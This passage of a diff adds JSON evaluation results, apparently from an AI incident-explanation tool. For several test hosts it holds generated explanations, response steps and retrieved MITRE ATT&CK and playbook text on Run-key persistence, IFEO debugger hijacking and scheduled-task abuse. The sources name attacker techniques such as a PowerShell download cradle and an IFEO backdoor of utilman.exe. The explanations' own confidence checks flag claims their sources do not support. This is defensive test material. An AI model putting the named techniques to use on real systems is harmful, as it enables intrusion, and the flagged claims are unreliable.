\n- The suggestion to “search other endpoints for the same file name or hash and look for lateral movement (T1570) or additional tool transfers” extends beyond what the sources provide.",
+        "recommended_response": "1. **Identify the file** – locate the exact path, name, hash, and creation timestamp. Compare its hash against known good files or malware databases.  \n2. **Determine the source** – check process creation logs, PowerShell or `certutil` command lines, and network logs to see how the file was downloaded (e.g., `Invoke‑WebRequest`, `wget`, etc.).  \n3. **Quarantine or delete** – isolate the host from the network and move the suspicious file to a safe location for deeper analysis (sandbox or malware analysis tool).  \n4. **Search for related activity** – query other endpoints for the same file name or hash, and look for lateral movement (T1570) or additional tool transfers that may indicate a broader compromise.",
+        "sources": [
+          {
+            "chunk_id": "mitre:T1105:1",
+            "document": "a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). On Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160), and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)  A number of these tools, such as `wget`, `curl`, and `scp`, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., via `certutil -hashfile`).(Citation: Google Cloud Threat Intelligence COSCMICENERGY 2023)",
+            "metadata": {
+              "technique_id": "T1105",
+              "technique_name": "Ingress Tool Transfer",
+              "source_type": "mitre_technique",
+              "tactics": "command-and-control"
+            },
+            "score": 0.43482843586369624
+          },
+          {
+            "chunk_id": "mitre:T1105:2",
+            "document": "lue (e.g., via `certutil -hashfile`).(Citation: Google Cloud Threat Intelligence COSCMICENERGY 2023) Adversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution](https://attack.mitre.org/techniques/T1204) (typically after interacting with [Phishing](https://attack.mitre.org/techniques/T1566) lures).(Citation: T1105: Trellix_search-ms)",
+            "metadata": {
+              "technique_id": "T1105",
+              "tactics": "command-and-control",
+              "source_type": "mitre_technique",
+              "technique_name": "Ingress Tool Transfer"
+            },
+            "score": 0.4217742416382077
+          },
+          {
+            "chunk_id": "mitre:T1105:0",
+            "document": "Ingress Tool Transfer Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)).",
+            "metadata": {
+              "source_type": "mitre_technique",
+              "tactics": "command-and-control",
+              "technique_name": "Ingress Tool Transfer",
+              "technique_id": "T1105"
+            },
+            "score": 0.40542740371712477
+          },
+          {
+            "chunk_id": "mitre:T1105:3",
+            "document": "th [Phishing](https://attack.mitre.org/techniques/T1566) lures).(Citation: T1105: Trellix_search-ms) Files can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016) In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.(Citation: Dropbox Malware Sync)",
+            "metadata": {
+              "technique_name": "Ingress Tool Transfer",
+              "source_type": "mitre_technique",
+              "tactics": "command-and-control",
+              "technique_id": "T1105"
+            },
+            "score": 0.38818627648104564
+          }
+        ]
+      }
+    },
+    {
+      "host": "SPOTCHECK-06",
+      "ground_truth": {
+        "expected_rule_title": "Registry Run Key Persistence",
+        "expected_technique_id": "T1547.001"
+      },
+      "incident": {
+        "incident_id": 8,
+        "title": "Registry Run Key Persistence on SPOTCHECK-06",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1547.001"
+        ]
+      },
+      "explain_response": {
+        "incident_id": 8,
+        "explanation": "## What happened  \nA registry value was added to one of the Windows “Run” keys (e.g., `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`) on host **SPOTCHECK‑06**. This key tells Windows to launch the specified program automatically each time the user logs on. The detection flagged the change as high‑severity because the new entry points to a script or executable in a typical drop location (such as `%TEMP%` or `%APPDATA%`) and it appeared right after a suspicious download or PowerShell activity.\n\n## Why it matters  \nThe activity matches **MITRE ATT&CK technique T1547.001 – Registry Run Keys / Startup Folder**.  \n- **Persistence**: By writing to a Run key, an attacker ensures their payload runs every time the user logs in, surviving reboots.  \n- **Privilege‑escalation**: The payload runs with the logged‑in user’s rights, which may be enough to move laterally or steal data.  \n- **Masquerading**: Attackers often give the registry entry a name that looks like a legitimate program to avoid detection.\n\n## Recommended next steps  \n1. **Collect the full registry value** (use the `Details` field from Sysmon Event ID 13) and note the exact command or file path it will execute.  \n2. **Identify the creating process** and its parent chain; a browser or Office app writing directly to a Run key is abnormal.  \n3. **Verify the referenced file** exists on disk; if so, quarantine or delete it and capture it for malware analysis.  \n4. **Delete the malicious registry entry** (`reg delete <key>\\<value>`). After cleanup, force a logoff or reboot to ensure the payload does not remain in memory.  \n5. **Check other autorun locations** (Startup folder, Winlogon Shell, services) for similar entries and reset the user’s credentials if credential theft is suspected.  \n\nThese steps follow the Registry Run Key / Startup Persistence Response Playbook and will help confirm the threat, remove persistence, and reduce the chance of re‑infection.\n\n**Confidence check:**\n- The draft states the registry value was added on host **SPOTCHECK‑06**, but none of the source chunks mention that specific host.  \n- The draft claims the detection flagged the change as “high‑severity”; the sources describe suspicious indicators but do not specify a severity rating.  \n- The draft says the payload “may be enough to move laterally or steal data” as a privilege‑escalation effect, but the sources only note that the program runs with the logged‑in user’s permissions and do not mention lateral movement or data theft.",
+        "recommended_response": "1. **Collect the full registry value** (use the `Details` field from Sysmon Event ID 13) and note the exact command or file path it will execute.  \n2. **Identify the creating process** and its parent chain; a browser or Office app writing directly to a Run key is abnormal.  \n3. **Verify the referenced file** exists on disk; if so, quarantine or delete it and capture it for malware analysis.  \n4. **Delete the malicious registry entry** (`reg delete <key>\\<value>`). After cleanup, force a logoff or reboot to ensure the payload does not remain in memory.  \n5. **Check other autorun locations** (Startup folder, Winlogon Shell, services) for similar entries and reset the user’s credentials if credential theft is suspected.  \n\nThese steps follow the Registry Run Key / Startup Persistence Response Playbook and will help confirm the threat, remove persistence, and reduce the chance of re‑infection.",
+        "sources": [
+          {
+            "chunk_id": "playbook:T1547_001_registry_run_key_persistence:0",
+            "document": "Registry Run Key / Startup Persistence Response Playbook\n\n## Detection Context\nOne of the oldest and still most common persistence techniques: adding an entry to\n`HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`,\n`HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` (or the `RunOnce` variants), or\ndropping a shortcut into the user's Startup folder, so a payload executes automatically at\nlogon. In Sysmon, this appears as Event ID 13 (registry value set) targeting one of the Run\nkey paths, or Event ID 11 (file creation) in\n`...\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\`. Suspicious indicators:\nvalue data pointing to scripts/executables in `%TEMP%`, `%APPDATA%`, or `C:\\Users\\Public\\`;\nvalue names mimicking legitimate software; the registry write immediately following a\nsuspicious download or PowerShell execution event.",
+            "metadata": {
+              "title": "Registry Run Key / Startup Persistence Response Playbook",
+              "source_file": "T1547_001_registry_run_key_persistence.md",
+              "technique_id": "T1547.001",
+              "source_type": "playbook"
+            },
+            "score": 0.5287322590030501
+          },
+          {
+            "chunk_id": "playbook:T1547_001_registry_run_key_persistence:1",
+            "document": "Registry Run Key / Startup Persistence Response Playbook\n\ntware; the registry write immediately following a\nsuspicious download or PowerShell execution event. ## Investigation Steps\n1. Pull the full registry value (`Details` field in Event ID 13) and identify the exact\n   command/path it will execute at next logon.\n2. Identify the process that made the registry write and its parent chain — a browser or\n   Office app writing directly to a Run key is highly anomalous.\n3. Check whether the referenced binary/script still exists on disk and inspect it if so.\n4. Check for the same or similarly-named Run key entries on other hosts (mass deployment\n   indicator).\n5. Correlate timing with any recent phishing email, download, or exploit activity on the\n   host.",
+            "metadata": {
+              "source_type": "playbook",
+              "technique_id": "T1547.001",
+              "source_file": "T1547_001_registry_run_key_persistence.md",
+              "title": "Registry Run Key / Startup Persistence Response Playbook"
+            },
+            "score": 0.4861548632942127
+          },
+          {
+            "chunk_id": "mitre:T1547.001:0",
+            "document": "Registry Run Keys / Startup Folder Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.(Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level. The following run keys are created by default on Windows systems:",
+            "metadata": {
+              "technique_id": "T1547.001",
+              "technique_name": "Registry Run Keys / Startup Folder",
+              "source_type": "mitre_technique",
+              "tactics": "persistence, privilege-escalation"
+            },
+            "score": 0.48359719503978693
+          },
+          {
+            "chunk_id": "playbook:T1547_001_registry_run_key_persistence:2",
+            "document": "Registry Run Key / Startup Persistence Response Playbook\n\n).\n5. Correlate timing with any recent phishing email, download, or exploit activity on the\n   host. ## Containment\n- Remove the malicious registry value (`reg delete` on the specific value, not the whole key).\n- Delete/quarantine the referenced payload file.\n- Isolate the host if the payload is confirmed to still be active in memory. ## Remediation\n- Force a logoff/reboot after cleanup to ensure no lingering process from the persisted\n  payload survives.\n- Review the user's other autorun locations (Startup folder, Winlogon Shell/Userinit,\n  services) for related entries left by the same actor.\n- Reset credentials for the affected account if initial access involved credential theft.",
+            "metadata": {
+              "source_file": "T1547_001_registry_run_key_persistence.md",
+              "technique_id": "T1547.001",
+              "source_type": "playbook",
+              "title": "Registry Run Key / Startup Persistence Response Playbook"
+            },
+            "score": 0.4580261823691156
+          },
+          {
+            "chunk_id": "mitre:T1547.001:7",
+            "document": "can add other programs or processes to this registry value which will automatically launch at boot. Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.",
+            "metadata": {
+              "source_type": "mitre_technique",
+              "technique_name": "Registry Run Keys / Startup Folder",
+              "tactics": "persistence, privilege-escalation",
+              "technique_id": "T1547.001"
+            },
+            "score": 0.45006178511997985
+          }
+        ]
+      }
+    },
+    {
+      "host": "SPOTCHECK-07",
+      "ground_truth": {
+        "expected_rule_title": "Registry IFEO Debugger Hijack",
+        "expected_technique_id": "T1546.012"
+      },
+      "incident": {
+        "incident_id": 9,
+        "title": "Registry IFEO Debugger Hijack on SPOTCHECK-07",
+        "severity": "critical",
+        "mitre_technique_ids": [
+          "T1546.012"
+        ]
+      },
+      "explain_response": {
+        "incident_id": 9,
+        "explanation": "## What happened\nA registry key on **SPOTCHECK‑07** was changed to point an IFEO (Image File Execution Options) *Debugger* value at a malicious program. When the targeted Windows executable runs, the system automatically launches the attacker‑controlled debugger instead, giving that program **SYSTEM** privileges.\n\n## Why it matters\n- **MITRE ATT&CK T1546.012 – Image File Execution Options Injection** – This technique lets an adversary attach a “debugger” to any executable via the registry (e.g., `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<exe>\\Debugger`).  \n- The injected debugger runs with the highest local privilege (SYSTEM), providing **privilege escalation** and **persistence** because the malicious code will be launched every time the victim executable starts.  \n- It can also be used to **disable security tools** by redirecting them to a fake debugger.\n\n## Recommended next steps\n1. **Inspect the IFEO registry path** on SPOTCHECK‑07 (`HKLM\\SOFTWARE\\...Image File Execution Options\\`) to identify which executable’s `Debugger` value was modified and capture the malicious command line.  \n2. **Delete or restore** the rogue `Debugger` value to its default (or remove the entire IFEO key if not needed) to stop the automatic launch.  \n3. **Locate the referenced malicious binary** on disk, hash it, and quarantine/delete it. Search for any copies in common locations (e.g., `C:\\Windows\\Temp`, user profile folders).  \n4. **Review Windows event logs** (process creation, registry modification) for evidence of when the change occurred and which account performed it. If the attacker may have obtained SYSTEM, consider resetting privileged credentials and monitoring for further lateral movement.  \n\n**Confidence check:**\n- The claim that a registry key on **SPOTCHECK‑07** was changed to point an IFEO Debugger value at a malicious program is not mentioned in the provided source chunks.  \n- The recommendation to inspect the IFEO registry path specifically on **SPOTCHECK‑07** is not supported by the sources, which only describe the general registry location, not a change on that host.",
+        "recommended_response": "1. **Inspect the IFEO registry path** on SPOTCHECK‑07 (`HKLM\\SOFTWARE\\...Image File Execution Options\\`) to identify which executable’s `Debugger` value was modified and capture the malicious command line.  \n2. **Delete or restore** the rogue `Debugger` value to its default (or remove the entire IFEO key if not needed) to stop the automatic launch.  \n3. **Locate the referenced malicious binary** on disk, hash it, and quarantine/delete it. Search for any copies in common locations (e.g., `C:\\Windows\\Temp`, user profile folders).  \n4. **Review Windows event logs** (process creation, registry modification) for evidence of when the change occurred and which account performed it. If the attacker may have obtained SYSTEM, consider resetting privileged credentials and monitoring for further lateral movement.",
+        "sources": [
+          {
+            "chunk_id": "mitre:T1546.012:4",
+            "document": "01) will cause the \"debugger\" program to be executed with SYSTEM privileges.(Citation: Tilbury 2014) Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer.(Citation: Elastic Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation. Malware may also use IFEO to impair defenses by registering invalid debuggers that redirect and effectively disable various system and security applications.(Citation: FSecure Hupigon)(Citation: Symantec Ushedix June 2008)",
+            "metadata": {
+              "technique_id": "T1546.012",
+              "technique_name": "Image File Execution Options Injection",
+              "tactics": "privilege-escalation, persistence",
+              "source_type": "mitre_technique"
+            },
+            "score": 0.4710450163534212
+          },
+          {
+            "chunk_id": "mitre:T1546.012:1",
+            "document": "er (e.g., <code>C:\\dbg\\ntsd.exe -g  notepad.exe</code>).(Citation: Microsoft Dev Blog IFEO Mar 2010) IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool.(Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<executable></code> where <code>&lt;executable&gt;</code> is the binary on which the debugger is attached.(Citation: Microsoft Dev Blog IFEO Mar 2010)",
+            "metadata": {
+              "source_type": "mitre_technique",
+              "tactics": "privilege-escalation, persistence",
+              "technique_name": "Image File Execution Options Injection",
+              "technique_id": "T1546.012"
+            },
+            "score": 0.45758939761260164
+          },
+          {
+            "chunk_id": "mitre:T1546.012:2",
+            "document": "</code> is the binary on which the debugger is attached.(Citation: Microsoft Dev Blog IFEO Mar 2010) IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process).(Citation: Microsoft Silent Process Exit NOV 2017)(Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\</code>.(Citation: Microsoft Silent Process Exit NOV 2017)(Citation: Oddvar Moe IFEO APR 2018)",
+            "metadata": {
+              "source_type": "mitre_technique",
+              "technique_name": "Image File Execution Options Injection",
+              "technique_id": "T1546.012",
+              "tactics": "privilege-escalation, persistence"
+            },
+            "score": 0.4562591355353656
+          },
+          {
+            "chunk_id": "mitre:T1546.012:3",
+            "document": "sExit\\</code>.(Citation: Microsoft Silent Process Exit NOV 2017)(Citation: Oddvar Moe IFEO APR 2018) Similar to [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures \"cmd.exe,\" or another program that provides backdoor access, as a \"debugger\" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the \"debugger\" program to be executed with SYSTEM privileges.(Citation: Tilbury 2014)",
+            "metadata": {
+              "technique_name": "Image File Execution Options Injection",
+              "technique_id": "T1546.012",
+              "tactics": "privilege-escalation, persistence",
+              "source_type": "mitre_technique"
+            },
+            "score": 0.43497224089928815
+          },
+          {
+            "chunk_id": "mitre:T1546.012:0",
+            "document": "Image File Execution Options Injection Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., <code>C:\\dbg\\ntsd.exe -g  notepad.exe</code>).(Citation: Microsoft Dev Blog IFEO Mar 2010)",
+            "metadata": {
+              "source_type": "mitre_technique",
+              "tactics": "privilege-escalation, persistence",
+              "technique_id": "T1546.012",
+              "technique_name": "Image File Execution Options Injection"
+            },
+            "score": 0.4333810665464502
+          }
+        ]
+      }
+    },
+    {
+      "host": "SPOTCHECK-08",
+      "ground_truth": {
+        "expected_rule_title": "Scheduled Task Creation via schtasks.exe",
+        "expected_technique_id": "T1053.005"
+      },
+      "incident": {
+        "incident_id": 10,
+        "title": "Scheduled Task Creation via schtasks.exe on SPOTCHECK-08",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1053.005"
+        ]
+      },
+      "explain_response": {
+        "incident_id": 10,
+        "explanation": "## What happened  \nA scheduled task was created on the host **SPOTCHECK‑08** using `schtasks.exe`. The task was added to the Windows Task Scheduler, which means it can run a command automatically (e.g., at logon or system start). The detection flagged this because creating tasks with the command‑line tool is a known way attackers establish persistence.\n\n## Why it matters  \nThe activity maps to **MITRE ATT&CK technique T1053.005 – Scheduled Task**. This technique is used by adversaries to **gain persistence** (the ability to run again after reboot) and sometimes to **escalate privileges** by running code as SYSTEM or another high‑privilege account. The playbook notes that tasks created by non‑admin tools, targeting user‑writable directories, or running as SYSTEM from a non‑admin session are strong red flags.\n\n## Recommended next steps  \n1. **Collect the task definition** – run `schtasks /query /tn <taskname> /xml` and review the `<Actions>` element to see the exact command and arguments.  \n2. **Identify the creator** – compare the task’s creation timestamp to Sysmon process events for `schtasks.exe` to find the parent process, user account, and any suspicious tooling.  \n3. **Validate the executable** – check whether the binary or script referenced by the task is a known Windows binary, is digitally signed, or resides in a user‑writable folder such as `%TEMP%` or `%APPDATA%`.  \n4. **Contain if malicious** – delete the task (`schtasks /delete /tn <taskname> /f`) and quarantine the referenced file for forensic analysis. If the task is confirmed malicious, isolate the host from the network.  \n\nThese steps follow the “Scheduled Task Persistence Response Playbook” and will help determine whether the task is benign or part of an attacker’s persistence chain.\n\n**Confidence check:**\n- The draft states that a scheduled task was created on the host **SPOTCHECK‑08** using `schtasks.exe`, but none of the provided source chunks mention the host name SPOTCHECK‑08.",
+        "recommended_response": "1. **Collect the task definition** – run `schtasks /query /tn <taskname> /xml` and review the `<Actions>` element to see the exact command and arguments.  \n2. **Identify the creator** – compare the task’s creation timestamp to Sysmon process events for `schtasks.exe` to find the parent process, user account, and any suspicious tooling.  \n3. **Validate the executable** – check whether the binary or script referenced by the task is a known Windows binary, is digitally signed, or resides in a user‑writable folder such as `%TEMP%` or `%APPDATA%`.  \n4. **Contain if malicious** – delete the task (`schtasks /delete /tn <taskname> /f`) and quarantine the referenced file for forensic analysis. If the task is confirmed malicious, isolate the host from the network.  \n\nThese steps follow the “Scheduled Task Persistence Response Playbook” and will help determine whether the task is benign or part of an attacker’s persistence chain.",
+        "sources": [
+          {
+            "chunk_id": "playbook:T1053_005_scheduled_task_persistence:1",
+            "document": "Scheduled Task Persistence Response Playbook\n\n`; tasks created by non-admin tooling; tasks\nconfigured to run at logon/startup with hidden windows. ## Investigation Steps\n1. Pull the full task definition (`schtasks /query /tn <name> /xml`) and inspect the\n   `<Actions>` element for the executed command and arguments.\n2. Check the task's creation time against the process creation event that made it, and\n   identify the parent process/user context that issued the create command.\n3. Verify whether the target binary path is a known-good, digitally signed Windows binary\n   or an unsigned/unexpected file in a user-writable directory.\n4. Search for other tasks created around the same time window on the same host or other\n   hosts by the same actor/account (lateral persistence pattern).\n5. Check the task's trigger and run-as-user — `SYSTEM`-level tasks created by a\n   non-administrative user session are a strong red flag.",
+            "metadata": {
+              "source_file": "T1053_005_scheduled_task_persistence.md",
+              "source_type": "playbook",
+              "title": "Scheduled Task Persistence Response Playbook",
+              "technique_id": "T1053.005"
+            },
+            "score": 0.5381841156860574
+          },
+          {
+            "chunk_id": "playbook:T1053_005_scheduled_task_persistence:0",
+            "document": "Scheduled Task Persistence Response Playbook\n\n## Detection Context\nAttackers create Scheduled Tasks (via `schtasks.exe`, `at.exe`, or direct registry/COM API\ncalls) to establish persistence or run payloads with elevated privileges at a chosen time or\ntrigger (logon, boot, idle). In Sysmon, this shows up as Event ID 1 process creation for\n`schtasks.exe /create ...`, or Event ID 12/13/14 registry events under\n`\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\`. Suspicious\nindicators: task names mimicking legitimate Windows tasks but pointing to binaries in\n`%TEMP%`, `%APPDATA%`, or `C:\\Users\\Public\\`; tasks created by non-admin tooling; tasks\nconfigured to run at logon/startup with hidden windows.",
+            "metadata": {
+              "title": "Scheduled Task Persistence Response Playbook",
+              "source_type": "playbook",
+              "technique_id": "T1053.005",
+              "source_file": "T1053_005_scheduled_task_persistence.md"
+            },
+            "score": 0.5305190121121335
+          },
+          {
+            "chunk_id": "mitre:T1053.005:0",
+            "document": "Scheduled Task",
+            "metadata": {
+              "source_type": "mitre_technique",
+              "technique_id": "T1053.005",
+              "technique_name": "Scheduled Task",
+              "tactics": "execution, persistence, privilege-escalation"
+            },
+            "score": 0.5044304339044084
+          },
+          {
+            "chunk_id": "playbook:T1053_005_scheduled_task_persistence:2",
+            "document": "Scheduled Task Persistence Response Playbook\n\ns-user — `SYSTEM`-level tasks created by a\n   non-administrative user session are a strong red flag. ## Containment\n- Disable/delete the malicious scheduled task (`schtasks /delete /tn <name> /f`).\n- Quarantine the referenced binary/script before deletion for forensic preservation.\n- Isolate the host if the task is confirmed to be executing attacker tooling. ## Remediation\n- Audit all scheduled tasks on the host for other unauthorized entries.\n- Restrict who can create tasks via Group Policy where feasible.\n- Add detection coverage for task creation targeting user-writable directories.",
+            "metadata": {
+              "source_file": "T1053_005_scheduled_task_persistence.md",
+              "source_type": "playbook",
+              "technique_id": "T1053.005",
+              "title": "Scheduled Task Persistence Response Playbook"
+            },
+            "score": 0.4887454531556172
+          },
+          {
+            "chunk_id": "mitre:T1053.005:1",
+            "document": "Scheduled Task Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel.(Citation: Stack Overflow) In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) (WMI) to create a scheduled task. Adversaries may also utilize the Powershell Cmdlet `Invoke-CimMethod`, which leverages WM",
+            "metadata": {
+              "source_type": "mitre_technique",
+              "technique_name": "Scheduled Task",
+              "technique_id": "T1053.005",
+              "tactics": "execution, persistence, privilege-escalation"
+            },
+            "score": 0.4644276579289766
+          }
+        ]
+      }
+    },
+    {
+      "host": "SPOTCHECK-09",
+      "ground_truth": {
+        "expected_rule_title": "Suspicious Scheduled Task via PowerShell Cmdlet",
+        "expected_technique_id": "T1053.005"
+      },
+      "incident": {
+        "incident_id": 11,
+        "title": "Suspicious Scheduled Task via PowerShell Cmdlet on SPOTCHECK-09",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1053.005"
+        ]
+      },
+      "explain_response": {
+        "incident_id": 11,
+        "explanation": "## What happened  \nA scheduled task was created on the host **SPOTCHECK‑09** using a PowerShell command. The task points to a binary located in a user‑writable folder, which is unusual for legitimate Windows tasks. The creation was flagged as high‑severity because it matches known indicators of malicious scheduled‑task abuse.\n\n## Why it matters  \n- **T1053.005 – Scheduled Task**: Attackers use the Windows Task Scheduler to run malicious code automatically (persistence) or with higher privileges (privilege‑escalation).  \n- The task was made via a PowerShell cmdlet rather than the normal `schtasks.exe` UI, which is a common technique for stealthy abuse.  \n- Running a task that launches a file from `%TEMP%`, `%APPDATA%`, or `C:\\Users\\Public` is a red flag because legitimate system tasks normally reference signed Windows binaries.\n\n## Recommended next steps  \n1. **Collect the task definition** – run `schtasks /query /tn <task_name> /xml` and examine the `<Actions>` element to see the exact command and arguments.  \n2. **Identify the creator** – correlate the task’s creation time with Sysmon events to find the parent process/user that issued the PowerShell cmdlet.  \n3. **Validate the binary** – check whether the executable path is a known‑good, digitally signed Windows file or an unexpected, unsigned file in a user‑writable directory.  \n4. **Contain and preserve** – if the task is malicious, delete it (`schtasks /delete /tn <task_name> /f`), quarantine the referenced binary for forensic analysis, and consider isolating the host while you investigate further.  \n\nThese actions follow the “Scheduled Task Persistence Response Playbook” and will help determine if the task is part of an attacker’s persistence mechanism and prevent further execution.\n\n**Confidence check:**\n- The draft states the scheduled task was created on the host **SPOTCHECK‑09**; none of the source chunks mention this host name.  \n- The draft claims the task “points to a binary located in a user‑writable folder”; the sources only describe such locations as suspicious indicators in general, not that this specific task does so.  \n- The draft says the creation was flagged as high‑severity because it matches known indicators of malicious scheduled‑task abuse; the sources do not discuss any severity rating or flagging process.  \n- The draft asserts the task was made via a PowerShell cmdlet rather than `schtasks.exe` and that this is a common technique for stealthy abuse; the sources note that PowerShell can be used to create tasks but do not claim it is a common stealth technique.  \n- The draft explains that launching a file from `%TEMP%`, `%APPDATA%`, or `C:\\Users\\Public` is a red flag because legitimate system tasks normally reference signed Windows binaries; the sources list those directories as suspicious but do not provide the rationale about signed binaries.",
+        "recommended_response": "1. **Collect the task definition** – run `schtasks /query /tn <task_name> /xml` and examine the `<Actions>` element to see the exact command and arguments.  \n2. **Identify the creator** – correlate the task’s creation time with Sysmon events to find the parent process/user that issued the PowerShell cmdlet.  \n3. **Validate the binary** – check whether the executable path is a known‑good, digitally signed Windows file or an unexpected, unsigned file in a user‑writable directory.  \n4. **Contain and preserve** – if the task is malicious, delete it (`schtasks /delete /tn <task_name> /f`), quarantine the referenced binary for forensic analysis, and consider isolating the host while you investigate further.  \n\nThese actions follow the “Scheduled Task Persistence Response Playbook” and will help determine if the task is part of an attacker’s persistence mechanism and prevent further execution.",
+        "sources": [
+          {
+            "chunk_id": "playbook:T1053_005_scheduled_task_persistence:0",
+            "document": "Scheduled Task Persistence Response Playbook\n\n## Detection Context\nAttackers create Scheduled Tasks (via `schtasks.exe`, `at.exe`, or direct registry/COM API\ncalls) to establish persistence or run payloads with elevated privileges at a chosen time or\ntrigger (logon, boot, idle). In Sysmon, this shows up as Event ID 1 process creation for\n`schtasks.exe /create ...`, or Event ID 12/13/14 registry events under\n`\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\`. Suspicious\nindicators: task names mimicking legitimate Windows tasks but pointing to binaries in\n`%TEMP%`, `%APPDATA%`, or `C:\\Users\\Public\\`; tasks created by non-admin tooling; tasks\nconfigured to run at logon/startup with hidden windows.",
+            "metadata": {
+              "title": "Scheduled Task Persistence Response Playbook",
+              "source_type": "playbook",
+              "source_file": "T1053_005_scheduled_task_persistence.md",
+              "technique_id": "T1053.005"
+            },
+            "score": 0.5656603445712866
+          },
+          {
+            "chunk_id": "playbook:T1053_005_scheduled_task_persistence:1",
+            "document": "Scheduled Task Persistence Response Playbook\n\n`; tasks created by non-admin tooling; tasks\nconfigured to run at logon/startup with hidden windows. ## Investigation Steps\n1. Pull the full task definition (`schtasks /query /tn <name> /xml`) and inspect the\n   `<Actions>` element for the executed command and arguments.\n2. Check the task's creation time against the process creation event that made it, and\n   identify the parent process/user context that issued the create command.\n3. Verify whether the target binary path is a known-good, digitally signed Windows binary\n   or an unsigned/unexpected file in a user-writable directory.\n4. Search for other tasks created around the same time window on the same host or other\n   hosts by the same actor/account (lateral persistence pattern).\n5. Check the task's trigger and run-as-user — `SYSTEM`-level tasks created by a\n   non-administrative user session are a strong red flag.",
+            "metadata": {
+              "title": "Scheduled Task Persistence Response Playbook",
+              "source_file": "T1053_005_scheduled_task_persistence.md",
+              "source_type": "playbook",
+              "technique_id": "T1053.005"
+            },
+            "score": 0.4846667926200558
+          },
+          {
+            "chunk_id": "playbook:T1053_005_scheduled_task_persistence:2",
+            "document": "Scheduled Task Persistence Response Playbook\n\ns-user — `SYSTEM`-level tasks created by a\n   non-administrative user session are a strong red flag. ## Containment\n- Disable/delete the malicious scheduled task (`schtasks /delete /tn <name> /f`).\n- Quarantine the referenced binary/script before deletion for forensic preservation.\n- Isolate the host if the task is confirmed to be executing attacker tooling. ## Remediation\n- Audit all scheduled tasks on the host for other unauthorized entries.\n- Restrict who can create tasks via Group Policy where feasible.\n- Add detection coverage for task creation targeting user-writable directories.",
+            "metadata": {
+              "source_type": "playbook",
+              "technique_id": "T1053.005",
+              "title": "Scheduled Task Persistence Response Playbook",
+              "source_file": "T1053_005_scheduled_task_persistence.md"
+            },
+            "score": 0.480689961287436
+          },
+          {
+            "chunk_id": "mitre:T1053.005:1",
